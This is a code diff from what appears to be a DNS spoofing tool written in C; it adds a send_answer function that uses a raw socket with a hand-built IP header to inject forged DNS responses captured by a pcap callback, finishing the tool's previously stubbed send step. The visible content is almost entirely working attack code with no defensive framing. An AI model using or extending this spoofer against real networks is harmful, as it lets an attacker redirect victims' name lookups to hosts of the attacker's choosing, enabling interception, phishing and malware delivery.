@@ -166,6 +166,30 @@ void build_datagram(char* datagram, unsigned int dns_size, struct net_addr naddr
 	ip_hdr->ip_sum = calculate_checksum((unsigned short *) datagram, ip_hdr->ip_len >> 1);
 }
 
+void send_answer(char* answer, struct net_addr naddr, unsigned int len){
+	struct sockaddr_in saddr;
+	int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	int on = 1;
+	
+	if (sfd < 0){
+		printf("Error creating socket\n");
+		exit(-1);
+	}
+	saddr.sin_family = AF_INET;
+	saddr.sin_port = htons(naddr.port);
+	saddr.sin_addr.s_addr = naddr.src_ip;
+	
+	if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, (char*) &on, sizeof(on)) < 0){
+		printf("Error setting socket\n");
+		exit(-1);
+	}
+
+	if (sendto(sfd, answer, len, 0, (struct sockaddr *)&saddr, sizeof(saddr)) < 0){
+		printf("Error sending answer");
+		exit(-1);
+	}
+}
+
 void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes){
 	printf("%dB of %dB\n", h->caplen, h-> len);
 	
@@ -188,7 +212,7 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes){
 	answer_size = create_answer(host, dns_hdr, dns_answer, &dns_query);
 	build_datagram(udp_answer, answer_size, naddr);
 	answer_size += (sizeof(struct ip) + sizeof(struct udphdr));
-	//TODO: send answer
+	send_answer(udp_answer, naddr, answer_size);
 }
 
 void dns_spoof(char *host, char *interface){
